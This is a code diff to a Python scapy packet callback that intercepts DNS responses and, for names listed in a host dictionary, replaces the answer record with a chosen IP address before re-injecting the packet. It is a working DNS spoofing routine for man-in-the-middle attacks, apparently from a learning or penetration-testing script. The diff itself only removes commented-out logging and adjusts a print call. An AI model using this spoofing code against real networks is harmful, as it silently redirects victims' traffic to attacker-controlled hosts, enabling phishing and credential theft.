@@ -29,7 +29,6 @@ def callback(captured_packet):
     if scapy_packet.haslayer(DNSRR):
         try:
             print("original - ", scapy_packet[DNSRR].summary)
-            # log.info(f'[original] {scapy_packet[DNSRR].summary()}')
             query_name = scapy_packet[DNSQR].qname
             if query_name in host_dict:
                 scapy_packet[DNS].an = DNSRR(rrname=query_name, rdata=host_dict[query_name])
@@ -39,10 +38,8 @@ def callback(captured_packet):
                 del scapy_packet[UDP].len
                 del scapy_packet[UDP].chksum
                 print("modified - ", scapy_packet[DNSRR].summary)
-                # log.info(f'[modified] {scapy_packet[DNSRR].summary()}')
             else:
-                print("not modified - ", scapy_packet[DNSRR].rdata)
-                # log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
+                print("not modified - ", scapy_packet[DNSRR].summary)
         except IndexError as ie:
             print("IndexError ", ie)
         captured_packet.set_payload(bytes(scapy_packet))
